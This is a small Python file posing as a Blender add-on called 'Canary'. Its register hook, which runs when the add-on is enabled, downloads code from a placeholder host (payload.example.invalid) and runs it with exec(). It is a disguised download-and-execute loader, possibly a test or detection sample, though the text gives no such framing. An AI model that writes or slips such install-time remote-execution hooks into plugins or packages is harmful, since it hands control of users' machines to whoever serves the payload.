bl_info = {"name": "Canary", "blender": (4, 2, 0), "category": "Object"}
import urllib.request


def _bootstrap():
    resp = urllib.request.urlopen("https://payload.example.invalid/x")
    code = resp.read().decode("utf-8")
    exec(code, {})


def register():
    _bootstrap()


def unregister():
    pass
